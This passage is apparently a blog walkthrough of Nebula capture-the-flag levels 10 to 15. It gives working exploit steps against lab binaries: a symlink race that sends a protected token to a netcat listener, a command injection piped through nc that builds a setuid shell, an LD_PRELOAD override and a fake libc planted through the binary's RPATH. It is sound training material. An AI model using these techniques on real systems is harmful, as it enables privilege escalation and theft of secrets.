<h1>include &lt;fcntl.h></h1>

<h1>include &lt;errno.h></h1>

<h1>include &lt;sys/socket.h></h1>

<h1>include &lt;netinet/in.h></h1>

<h1>include &lt;string.h></h1>

<p>int main(int argc, char <em><em>argv)
{
  char </em>file;
  char </em>host;</p>

<p>  if(argc &lt; 3) {</p>

<pre><code>  printf("%s file host\n\tsends file to host if you have access to it\n", argv[0]);
  exit(1);
</code></pre>

<p>  }</p>

<p>  file = argv[1];
  host = argv[2];</p>

<p>  if(access(argv[1], R_OK) == 0) {</p>

<pre><code>  int fd;
  int ffd;
  int rc;
  struct sockaddr_in sin;
  char buffer[4096];

  printf("Connecting to %s:18211 .. ", host); fflush(stdout);

  fd = socket(AF_INET, SOCK_STREAM, 0);

  memset(&amp;sin, 0, sizeof(struct sockaddr_in));
  sin.sin_family = AF_INET;
  sin.sin_addr.s_addr = inet_addr(host);
  sin.sin_port = htons(18211);

  if(connect(fd, (void *)&amp;sin, sizeof(struct sockaddr_in)) == -1) {
      printf("Unable to connect to host %s\n", host);
      exit(EXIT_FAILURE);
  }
</code></pre>

<h1>define HITHERE &ldquo;.oO Oo.\n&rdquo;</h1>

<pre><code>  if(write(fd, HITHERE, strlen(HITHERE)) == -1) {
      printf("Unable to write banner to host %s\n", host);
      exit(EXIT_FAILURE);
  }
</code></pre>

<h1>undef HITHERE</h1>

<pre><code>  printf("Connected!\nSending file .. "); fflush(stdout);

  ffd = open(file, O_RDONLY);
  if(ffd == -1) {
      printf("Damn. Unable to open file\n");
      exit(EXIT_FAILURE);
  }

  rc = read(ffd, buffer, sizeof(buffer));
  if(rc == -1) {
      printf("Unable to read from file: %s\n", strerror(errno));
      exit(EXIT_FAILURE);
  }

  write(fd, buffer, rc);

  printf("wrote file!\n");
</code></pre>

<p>  } else {</p>

<pre><code>  printf("You don't have access to %s\n", file);
</code></pre>

<p>  }
}
```</p>

<p>As the description has it, this program seems to read a file and send its contents to a user specified IP address on tcp/18211. I tested this by opening a netcat listener with <code>nc -lk 18211</code> and sending myself a file to see what comes out. Obviously, I was not able to send the token that was in the same directory as the <code>flag10</code> binary as I did not have read access to this.</p>

<p>The problem with this program through is the fact that it checks if the file can be read using <code>access()</code>, then only later opens it using <code>open()</code>. Using this method it may be possible to change out the file before it hits the <code>open()</code> method. Symlinks are the goto for this kind of problem as they can be easily swapped out by relinking a file as the program runs. It of course helps that the file to read can be user specified. There is actually an acronym for this kind of bug called <a href="http://en.wikipedia.org/wiki/Time_of_check_to_time_of_use">TOCTTOU</a>. The Wikipedia article describes almost exactly the same scenario as we have here.</p>

<p>My plan of attack was to create a race condition. I would create an infinite loop that relinks a file from something I can actually read back to the token file and vice versa. While this continuous relinking occurs, I would run the affected binary, hoping that we would catch a case where the link swaps out as hoped for sending the token contents to my netcat listener. To increase my chances of the race condition occurring, I put the <code>flag10</code> binary in its own loop as well.</p>

<p>So, to solve level10:</p>

<p>```bash
level10@nebula:/home/flag10$ while true; do ln -sf /var/tmp/shell.c /var/tmp/flag10-token; ln -sf /home/flag10/token /var/tmp/flag10-token; done &amp;
[1] 14219</p>

<h1>the counties symlink swap is now happening between /var/tmp/shell.c which I can read and /home/flag10/token which I cant.</h1>

<p>level10@nebula:/home/flag10$ while true; do ./flag10 /var/tmp/flag10-token 192.168.217.1; done
You don&rsquo;t have access to /var/tmp/flag10-token
You don&rsquo;t have access to /var/tmp/flag10-token
Connecting to 192.168.217.1:18211 .. Connected!
Sending file .. wrote file!
Connecting to 192.168.217.1:18211 .. Connected!
Sending file .. wrote file!
Connecting to 192.168.217.1:18211 .. Connected!
Sending file .. wrote file!
```</p>

<p>On my netcat listener I now had:</p>

<p>```bash
~ » nc -lk 18211
.oO Oo.</p>

<h1>include&lt;stdio.h></h1>

<p>int main(void) {</p>

<pre><code>setresuid(geteuid(), geteuid(), geteuid());
system("/bin/sh");
return 0;
</code></pre>

<p>}</p>

<p>.oO Oo.
615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
.oO Oo.
615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
.oO Oo.
615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
.oO Oo.
```</p>

<p>With the token file read, we end the level:</p>

<p><code>bash
level10@nebula:/home/flag10$ su - flag10
Password:
flag10@nebula:~$ getflag
You have successfully executed getflag on a target account
</code></p>

<h2>level11</h2>

<p><a href="https://exploit-exercises.com/nebula/level11/">Level11&rsquo;s Description</a>:
<blockquote><p>The setuid binary at /home/flag10/flag10 binary will upload any file given, as long as it meets the requirements of the access() system call.</p></blockquote></p>

<p>With the description we are provided with the source code of a small PHP program:</p>

<p>```c level11.c</p>

<h1>include &lt;stdlib.h></h1>

<h1>include &lt;unistd.h></h1>

<h1>include &lt;string.h></h1>

<h1>include &lt;sys/types.h></h1>

<h1>include &lt;fcntl.h></h1>

<h1>include &lt;stdio.h></h1>

<h1>include &lt;sys/mman.h></h1>

<p>/<em>
 * Return a random, non predictable file, and return the file descriptor for it.
 </em>/</p>

<p>int getrand(char <em>*path)
{
  char </em>tmp;
  int pid;
  int fd;</p>

<p>  srandom(time(NULL));</p>

<p>  tmp = getenv(&ldquo;TEMP&rdquo;);
  pid = getpid();</p>

<p>  asprintf(path, &ldquo;%s/%d.%c%c%c%c%c%c&rdquo;, tmp, pid,</p>

<pre><code>  'A' + (random() % 26), '0' + (random() % 10),
  'a' + (random() % 26), 'A' + (random() % 26),
  '0' + (random() % 10), 'a' + (random() % 26));
</code></pre>

<p>  fd = open(<em>path, O_CREAT|O_RDWR, 0600);
  unlink(</em>path);
  return fd;
}</p>

<p>void process(char *buffer, int length)
{
  unsigned int key;
  int i;</p>

<p>  key = length &amp; 0xff;</p>

<p>  for(i = 0; i &lt; length; i++) {</p>

<pre><code>  buffer[i] ^= key;
  key -= buffer[i];
</code></pre>

<p>  }</p>

<p>  system(buffer);
}</p>

<h1>define CL &ldquo;Content-Length: &rdquo;</h1>

<p>int main(int argc, char <em><em>argv)
{
  char line[256];
  char buf[1024];
  char </em>mem;
  int length;
  int fd;
  char </em>path;</p>

<p>  if(fgets(line, sizeof(line), stdin) == NULL) {</p>

<pre><code>  errx(1, "reading from stdin");
</code></pre>

<p>  }</p>

<p>  if(strncmp(line, CL, strlen(CL)) != 0) {</p>

<pre><code>  errx(1, "invalid header");
</code></pre>

<p>  }</p>

<p>  length = atoi(line + strlen(CL));</p>

<p>  if(length &lt; sizeof(buf)) {</p>

<pre><code>  if(fread(buf, length, 1, stdin) != length) {
      err(1, "fread length");
  }
  process(buf, length);
</code></pre>

<p>  } else {</p>

<pre><code>  int blue = length;
  int pink;

  fd = getrand(&amp;path);

  while(blue &gt; 0) {
      printf("blue = %d, length = %d, ", blue, length);

      pink = fread(buf, 1, sizeof(buf), stdin);
      printf("pink = %d\n", pink);

      if(pink &lt;= 0) {
          err(1, "fread fail(blue = %d, length = %d)", blue, length);
      }
      write(fd, buf, pink);

      blue -= pink;
  }

  mem = mmap(NULL, length, PROT_READ|PROT_WRITE, MAP_PRIVATE, fd, 0);
  if(mem == MAP_FAILED) {
      err(1, "mmap");
  }
  process(mem, length);
</code></pre>

<p>  }</p>

<p>}
```</p>

<p>I&rsquo;ll admit. This level kicked my ass. Eventually I gave up and resorted to a few hints that could tell me how to proceed. None of the other walkthroughs that I read actually had working exploits for this level either. That which I have tried never got me to even execute <code>getflag</code> so that it would be happy with the effective user ids. Maybe this level is bugged, but I am not sure :(</p>

<h2>level12</h2>

<p><a href="https://exploit-exercises.com/nebula/level12/">Level12&rsquo;s Description</a>:
<blockquote><p>There is a backdoor process listening on port 50001.</p></blockquote></p>

<p>With the description we are provided with the source code of a small Lua program:</p>

<p>```lua level12.lua
local socket = require(&ldquo;socket&rdquo;)
local server = assert(socket.bind(&ldquo;127.0.0.1&rdquo;, 50001))</p>

<p>function hash(password)
  prog = io.popen(&ldquo;echo &rdquo;..password..&ldquo; | sha1sum&rdquo;, &ldquo;r&rdquo;)
  data = prog:read(&ldquo;*all&rdquo;)
  prog:close()</p>

<p>  data = string.sub(data, 1, 40)</p>

<p>  return data
end</p>

<p>while 1 do
  local client = server:accept()
  client:send(&ldquo;Password: &rdquo;)
  client:settimeout(60)
  local line, err = client:receive()
  if not err then</p>

<pre><code>  print("trying " .. line) -- log from where ;\
  local h = hash(line)

  if h ~= "4754a4f4bd5787accd33de887b9250a0691dd198" then
      client:send("Better luck next time\n");
  else
      client:send("Congrats, your token is 413**CARRIER LOST**\n")
  end
</code></pre>

<p>  end</p>

<p>  client:close()
end
```</p>

<p>This level had another very obvious command injection vulnerability on the line where a <code>password</code> variable is piped through <code>sha1sum</code>. I made a copy of this program and modified it to print me the outputs so that I could prepare a properly formatted command to be used on a socket. The basic idea of the injection was to separate the echo with a <code>;</code> character and compile my setuid C shell. I then added a hash (#) to ignore the rest of the command what would have been executed.</p>

<p>So, to solve level12:</p>

<p>```bash
level12@nebula:~$ echo &ldquo;;gcc /var/tmp/shell.c -o /var/tmp/flag12;chmod 4777 /var/tmp/flag12;#&rdquo; | nc 127.0.0.1 50001
Password: Better luck next time</p>

<p>level12@nebula:~$ /var/tmp/flag12
sh-4.2$ getflag
You have successfully executed getflag on a target account
sh-4.2$
```</p>

<h2>level13</h2>

<p><a href="https://exploit-exercises.com/nebula/level13/">Level13&rsquo;s Description</a>:
<blockquote><p>There is a security check that prevents the program from continuing execution if the user invoking it does not match a specific user id.</p></blockquote></p>

<p>With the description we are provided with the source code of a small C program:</p>

<p>```lua level13_safe.c</p>

<h1>include &lt;stdlib.h></h1>

<h1>include &lt;unistd.h></h1>

<h1>include &lt;stdio.h></h1>

<h1>include &lt;sys/types.h></h1>

<h1>include &lt;string.h></h1>

<h1>define FAKEUID 1000</h1>

<p>int main(int argc, char <strong>argv, char </strong>envp)
{
  int c;
  char token[256];</p>

<p>  if(getuid() != FAKEUID) {</p>

<pre><code>  printf("Security failure detected. UID %d started us, we expect %d\n", getuid(), FAKEUID);
  printf("The system administrators will be notified of this violation\n");
  exit(EXIT_FAILURE);
</code></pre>

<p>  }</p>

<p>  // snip, sorry :)</p>

<p>  printf(&ldquo;your token is %s\n&rdquo;, token);</p>

<p>}
```</p>

<p>This level had me researching for quite some time. I came to learn of ELF DSO&rsquo;s and <code>LD_PRELOAD</code>. Basically, it is possible to have the dynamic linker preload shared libraries from the <code>LD_PRELOAD</code> environment variable that may allow for some functions to be modified. <a href="https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/">This</a> article contained most of the magic that was needed to get this level done.</p>

<p>I decided to &lsquo;override&rsquo; the <code>getuid()</code> function so that it would return the value of the <code>FAKEUID</code> constant in the program, instead of the value the real <code>getuid()</code> would have returned. For that to happen, I looked up the arguments for <code>getuid()</code> from the man page and copied that for my own purposes. I then compiled it as a shared library with the famous <code>-shared -fPIC</code> arguments for position independent code and exported the <code>LD_PRELOAD</code> variable prior to running the binary.</p>

<p>One important thing to note here is that this &lsquo;hack&rsquo; has a few gotchas. The executing binary and the library needs to be relative to each other. SETUID programs discard the <code>LD_PRELOAD</code> environment variable (for obvious reasons) so this is not a privilege escalation. In the source code we have received, there is a portion excluded (that probably just prints the token :P) on purpose. This means we can copy the binary and still be able to get the desired effect. Of course, we could also resort to slapping this into a debugger and checking what it is doing under the hood, but given the nature of Nebula, I figured the point is to actually override <code>getuid()</code>.</p>

<p>So, to solve level13:</p>

<p>```bash
level13@nebula:/var/tmp$ cp ~flag13/flag13 .</p>

<p>level13@nebula:/var/tmp$ cat fake_getuid.c</p>

<h1>include&lt;unistd.h></h1>

<p>uid_t getuid(void) {</p>

<pre><code>return 1000;
</code></pre>

<p>}</p>

<p>level13@nebula:/var/tmp$ gcc -shared -fPIC /var/tmp/fake_getuid.c -o /var/tmp/fake_getuid.o</p>

<p>level13@nebula:/var/tmp$ LD_PRELOAD=/var/tmp/fake_getuid.o ./flag13
your token is b705702b-76a8-42b0-8844-3adabbe5ac58</p>

<p>level13@nebula:/var/tmp$ su &ndash; flag13
Password:
flag13@nebula:~$ getflag
You have successfully executed getflag on a target account
```</p>

<h2>level14</h2>

<p><a href="https://exploit-exercises.com/nebula/level14/">Level14&rsquo;s Description</a>:
<blockquote><p>This program resides in /home/flag14/flag14. It encrypts input and writes it to standard output. An encrypted token file is also in that home directory, decrypt it :)</p></blockquote></p>

<p>Logged in as user <code>level14</code>, we see 2 files in the <code>flag14</code> directory:</p>

<p>```bash
level14@nebula:~$ cd ~flag14
level14@nebula:/home/flag14$ ls -lh
total 8.0K
-rwsr-x&mdash;&ndash; 1 flag14  level14 7.2K 2011-12-05 18:59 flag14
-rw&mdash;&mdash;&mdash;&ndash; 1 level14 level14   37 2011-12-05 18:59 token</p>

<p>level14@nebula:/home/flag14$ cat token
857:g67?5ABBo:BtDA?tIvLDKL{MQPSRQWW.
<code>``
</code>token<code>obviously being the target to decrypt. Running</code>flag14<code>tells us that it is expecting a</code>-e` flag to encrypt. So, I tested the encryption to see how it behaves:</p>

<p><code>bash
level14@nebula:/home/flag14$ ./flag14 -e
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^(
</code></p>

<p>What immediately jumped out at me was the A&rsquo;s that I had sent it came back as the alphabet. :D After a few tests I came to the conclusion that the key seems to start at 0, and increments with every character. Each characters ASCII value is then incremented by what ever the current value of the key is. To test this theory, I wrote a small python script to replicate this behavior:</p>

<p>```python</p>

<h1>!/usr/bin/python</h1>

<h1>exploit-exercises level14 cryptor</h1>

<p>string = &lsquo;AABBCCDDEEFFGG&rsquo;
key = 0
result = &lsquo;&rsquo;</p>

<p>print &lsquo;String: {s}\nStrlen: {l}\t&rsquo;.format(s = string, l = len(string))</p>

<p>for char in string:</p>

<pre><code>print 'Key: {key}\t Char: {char}\t Ord: {ord}\t Res: {res}'.format(
    key = key, char = char, ord = ord(char), res = chr(ord(char) + key)
)
result += chr(ord(char) + key)
key += 1
</code></pre>

<p>print &lsquo;\nResult: {res}&rsquo;.format(res = result)
```</p>

<p>Running this meant that the output would be:</p>

<p>```text
~ # python crypt.py
String: AABBCCDDEEFFGG
Strlen: 14
Key: 0   Char: A     Ord: 65     Res: A
Key: 1   Char: A     Ord: 65     Res: B
Key: 2   Char: B     Ord: 66     Res: D
Key: 3   Char: B     Ord: 66     Res: E
Key: 4   Char: C     Ord: 67     Res: G
Key: 5   Char: C     Ord: 67     Res: H
Key: 6   Char: D     Ord: 68     Res: J
Key: 7   Char: D     Ord: 68     Res: K
Key: 8   Char: E     Ord: 69     Res: M
Key: 9   Char: E     Ord: 69     Res: N
Key: 10  Char: F     Ord: 70     Res: P
Key: 11  Char: F     Ord: 70     Res: Q
Key: 12  Char: G     Ord: 71     Res: S
Key: 13  Char: G     Ord: 71     Res: T</p>

<p>Result: ABDEGHJKMNPQST
```</p>

<p>The same string was checked using the <code>flag14</code> cryptor:</p>

<p><code>bash
level14@nebula:/home/flag14$ ./flag14 -e
AABBCCDDEEFFGG
ABDEGHJKMNPQST
</code></p>

<p>A match :) Being able to replicate the encryption, meant that the decryption was trivial. Instead of adding 1 to the key, I simply subtracted 1 from the key in order to reverse the string in the <code>token</code> file:</p>

<p>```text
~ # python decrypt.py
String: 857:g67?5ABBo:BtDA?tIvLDKL{MQPSRQWW.
Strlen: 36  Key start = 0
Key: 0   Char: 8     Ord: 56     Res: 8
Key: 1   Char: 5     Ord: 53     Res: 4
Key: 2   Char: 7     Ord: 55     Res: 5
Key: 3   Char: :     Ord: 58     Res: 7
Key: 4   Char: g     Ord: 103    Res: c
Key: 5   Char: 6     Ord: 54     Res: 1
Key: 6   Char: 7     Ord: 55     Res: 1
Key: 7   Char: ?     Ord: 63     Res: 8
Key: 8   Char: 5     Ord: 53     Res: &ndash;
Key: 9   Char: A     Ord: 65     Res: 8
Key: 10  Char: B     Ord: 66     Res: 8
Key: 11  Char: B     Ord: 66     Res: 7
Key: 12  Char: o     Ord: 111    Res: c
Key: 13  Char: :     Ord: 58     Res: &ndash;
Key: 14  Char: B     Ord: 66     Res: 4
Key: 15  Char: t     Ord: 116    Res: e
Key: 16  Char: D     Ord: 68     Res: 4
Key: 17  Char: A     Ord: 65     Res: 0
Key: 18  Char: ?     Ord: 63     Res: &ndash;
Key: 19  Char: t     Ord: 116    Res: a
Key: 20  Char: I     Ord: 73     Res: 5
Key: 21  Char: v     Ord: 118    Res: a
Key: 22  Char: L     Ord: 76     Res: 6
Key: 23  Char: D     Ord: 68     Res: &ndash;
Key: 24  Char: K     Ord: 75     Res: 3
Key: 25  Char: L     Ord: 76     Res: 3
Key: 26  Char: {     Ord: 123    Res: a
Key: 27  Char: M     Ord: 77     Res: 2
Key: 28  Char: Q     Ord: 81     Res: 5
Key: 29  Char: P     Ord: 80     Res: 3
Key: 30  Char: S     Ord: 83     Res: 5
Key: 31  Char: R     Ord: 82     Res: 3
Key: 32  Char: Q     Ord: 81     Res: 1
Key: 33  Char: W     Ord: 87     Res: 6
Key: 34  Char: W     Ord: 87     Res: 5
Key: 35  Char: .     Ord: 46     Res:</p>

<p>Result: 8457c118-887c-4e40-a5a6-33a25353165
```</p>

<p>So, to solve level14:</p>

<p><code>bash
level14@nebula:/home/flag14$ su - flag14
Password:
flag14@nebula:~$ getflag
You have successfully executed getflag on a target account
</code></p>

<h2>level15</h2>

<p><a href="https://exploit-exercises.com/nebula/level15/">Level15&rsquo;s Description</a>:
<blockquote><p>strace the binary at /home/flag15/flag15 and see if you spot anything out of the ordinary.<br/>You may wish to review how to “compile a shared library in linux” and how the libraries are loaded and processed by reviewing the dlopen manpage in depth.<br/>Clean up after yourself :)</p></blockquote></p>

<p>Logged in as user <code>level15</code>, we see 1 file in the <code>flag15</code> directory called <code>flag15</code>. Running it simply tells us to <em>strace it!</em>. Running it with <code>strace</code> immediately reveals a whole bunch of interesting things about <code>flag15</code>:</p>

<p><code>text
level15@nebula:/home/flag15$ strace ./flag15
execve("./flag15", ["./flag15"], [/* 20 vars */]) = 0
brk(0)                                  = 0x88c9000
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb786b000
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/tls/i686/sse2/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/tls/i686/sse2/cmov", 0xbfd0bf54) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/tls/i686/sse2/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/tls/i686/sse2", 0xbfd0bf54) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/tls/i686/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/tls/i686/cmov", 0xbfd0bf54) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/tls/i686/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/tls/i686", 0xbfd0bf54) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/tls/sse2/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/tls/sse2/cmov", 0xbfd0bf54) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/tls/sse2/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/tls/sse2", 0xbfd0bf54) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/tls/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/tls/cmov", 0xbfd0bf54) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/tls/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/tls", 0xbfd0bf54) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/i686/sse2/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/i686/sse2/cmov", 0xbfd0bf54) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/i686/sse2/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/i686/sse2", 0xbfd0bf54) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/i686/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/i686/cmov", 0xbfd0bf54) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/i686/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/i686", 0xbfd0bf54) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/sse2/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/sse2/cmov", 0xbfd0bf54) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/sse2/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/sse2", 0xbfd0bf54) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/cmov", 0xbfd0bf54) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15", {st_mode=S_IFDIR|0775, st_size=3, ...}) = 0
open("/etc/ld.so.cache", O_RDONLY)      = 3
fstat64(3, {st_mode=S_IFREG|0644, st_size=33815, ...}) = 0
mmap2(NULL, 33815, PROT_READ, MAP_PRIVATE, 3, 0) = 0xb7862000
close(3)                                = 0
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/i386-linux-gnu/libc.so.6", O_RDONLY) = 3
read(3, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\222\1\0004\0\0\0"..., 512) = 512
fstat64(3, {st_mode=S_IFREG|0755, st_size=1544392, ...}) = 0
mmap2(NULL, 1554968, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xe78000
mmap2(0xfee000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x176) = 0xfee000
mmap2(0xff1000, 10776, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xff1000
close(3)                                = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7861000
set_thread_area({entry_number:-1 -&gt; 6, base_addr:0xb78618d0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
mprotect(0xfee000, 8192, PROT_READ)     = 0
mprotect(0x8049000, 4096, PROT_READ)    = 0
mprotect(0x199000, 4096, PROT_READ)     = 0
munmap(0xb7862000, 33815)               = 0
fstat64(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 1), ...}) = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb786a000
write(1, "strace it!\n", 11strace it!
)            = 11
exit_group(11)                          = ?
</code></p>

<p>There are <strong>plenty</strong> of attempts to load <code>libc.so.6</code> from various locations! I checked out what is in <code>/var/tmp</code> and found the original <code>flag15</code> folder there. It was empty. My initial thought were I need to give it a <code>libc.so.6</code> to load, but obviously one that will be useful enough to me so that I may gain some form of code execution.</p>

<p>This challenge had me on another Google ride in order to understand what is going on here. From what I could gather, when a binary is compiled with <code>gcc</code>, it is possible to add <code>hwcap</code> support for different processor architectures. It is also possible to tell the linker from where it should load dynamic libraries using a <a href="http://en.wikipedia.org/wiki/Rpath">rpath</a>. In the case of <code>flag15</code>, the <code>RPATH</code> is set to <code>/var/tmp/flag15</code>. We can see this using <code>readelf</code> and looking at the dynamic section:</p>

<p>```bash
level15@nebula:/home/flag15$ readelf -d ./flag15</p>

<p>Dynamic section at offset 0xf20 contains 21 entries:
  Tag        Type                         Name/Value
 0x00000001 (NEEDED)                     Shared library: [libc.so.6]
 0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]
 0x0000000c (INIT)                       0x80482c0
 0x0000000d (FINI)                       0x80484ac</p>

<p> [&hellip;]
```</p>

<p>Ok, so that kinda explained the <em>why</em> its loading libc.so.6 from there, but not really the &lsquo;how this can be useful&rsquo;. I was still a little stuck on the previous <code>LD_PRELOAD</code> hackery, but had to constantly remind myself that that environment variable will be discarded in the case of the SETUID program.</p>

<p>I was a little unsure how to get something useful going from here. I touched a file called <code>libc.so.6</code> in <code>/var/tmp/flag15/</code> and launched the binary, just to get a starting point:</p>

<p><code>bash
level15@nebula:/var/tmp/flag15$ touch libc.so.6
level15@nebula:/var/tmp/flag15$ ~flag15/flag15
/home/flag15/flag15: error while loading shared libraries: /var/tmp/flag15/libc.so.6: file too short
</code></p>

<p>I was not expecting much from that attempt, but it helped me get started. Eventually I figured I could have a look at <code>flag15</code> and check which libc function I could &ldquo;override??&rdquo; from the RELO table:</p>

<p>```bash
level15@nebula:/var/tmp/flag15$ objdump -R ~flag15/flag15</p>

<p>/home/flag15/flag15:     file format elf32-i386</p>

<p>DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
08049ff0 R_386_GLOB_DAT    <strong>gmon_start</strong>
0804a000 R_386_JUMP_SLOT   puts
0804a004 R_386_JUMP_SLOT   <strong>gmon_start</strong>
0804a008 R_386_JUMP_SLOT   __libc_start_main
```</p>

<p><code>puts()</code> seems like an ok target for me! This is probably the function used to print the <em>strace it!</em> message. At this stage I figured I could take the same route as I did with the previous <code>LD_PRELOAD</code> attack, except this time I just &lsquo;fake&rsquo; it in my fake libc. I looked up the <code>puts()</code> arguments from the man page again and started a new function:</p>

<p>```bash
level15@nebula:/var/tmp/flag15$ cat fake_libc.c</p>

<h1>include&lt;stdio.h></h1>

<p>int puts(const char *s) {</p>

<pre><code>printf("Not the real puts!\n");
</code></pre>

<p>}</p>

<p>level15@nebula:/var/tmp/flag15$ gcc -shared -fPIC fake_libc.c -o libc.so.6</p>

<p>level15@nebula:/var/tmp/flag15$ ~flag15/flag15
/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /home/flag15/flag15)
/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /var/tmp/flag15/libc.so.6)
/home/flag15/flag15: relocation error: /var/tmp/flag15/libc.so.6: symbol __cxa_finalize, version GLIBC_2.1.3 not defined in file libc.so.6 with link time reference
```</p>

<p>Ow, that exploded pretty badly it seems. From the error message I figured the function <code>__cxa_finalize</code> simply did not exist in my library, so all I had to do was add it&hellip; Right? I googled the <a href="https://refspecs.linuxbase.org/LSB_3.2.0/LSB-Core-generic/LSB-Core-generic/baselib---cxa_finalize.html">function arguments</a> and added it to my fake libc:</p>

<p>```bash
level15@nebula:/var/tmp/flag15$ cat fake_libc.c</p>

<h1>include&lt;stdio.h></h1>

<p>void __cxa_finalize(void * d) {
}</p>

<p>int puts(const char *s) {</p>

<pre><code>printf("Not the real puts!\n");
</code></pre>

<p>}
level15@nebula:/var/tmp/flag15$ gcc -shared -fPIC fake_libc.c -o libc.so.6
level15@nebula:/var/tmp/flag15$ ~flag15/flag15
/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /home/flag15/flag15)
/home/flag15/flag15: relocation error: /home/flag15/flag15: symbol __libc_start_main, version GLIBC_2.0 not defined in file libc.so.6 with link time reference
```</p>

<p>Oh! New error. I guess I was making progress. This time there is apparently no <code>__libc_start_main</code> in the library. At this stage I was a little confused as to what was going on here as this function was also in the RELO table for <code>flag15</code>. Anyways, as with <code>__cxa_finalize</code>, I Googled the <a href="http://refspecs.linuxbase.org/LSB_3.1.1/LSB-Core-generic/LSB-Core-generic/baselib---libc-start-main-.html">function arguments</a> for this one too and added it to my fake libc. It was also at this stage that I realized I could just use this function instead of <code>puts</code>, so I went ahead and deleted the other functions:</p>

<p>```bash
level15@nebula:/var/tmp/flag15$ cat fake_libc.c</p>

<h1>include&lt;stdio.h></h1>

<p>int __libc_start_main(int (<em>main) (int, char * </em>, char * <em>), int argc, char * * ubp_av, void (</em>init) (void), void (<em>fini) (void), void (</em>rtld_fini) (void), void (* stack_end)) {</p>

<pre><code>return 0;
</code></pre>

<p>}</p>

<p>level15@nebula:/var/tmp/flag15$ gcc -shared -fPIC fake_libc.c -o libc.so.6
level15@nebula:/var/tmp/flag15$ ~flag15/flag15
/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /home/flag15/flag15)
Inconsistency detected by ld.so: dl-lookup.c: 169: check_match: Assertion `version->filename == ((void *)0) || ! _dl_name_match_p (version->filename, map)&lsquo; failed!
```</p>

<p>Oh! Another new error :( This time though it was not about a missing function/symbol, but rather something I could not make out by myself. I found little information about this specific error. After a really really long time of searching I finally decided to <code>ldd</code> <code>flag15</code> again now that my fake libc is available:</p>

<p>```bash
level15@nebula:/var/tmp/flag15$ ldd ~flag15/flag15
/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /home/flag15/flag15)</p>

<pre><code>linux-gate.so.1 =&gt;  (0x00e47000)
libc.so.6 =&gt; /var/tmp/flag15/libc.so.6 (0x00761000)
</code></pre>

<p>```</p>

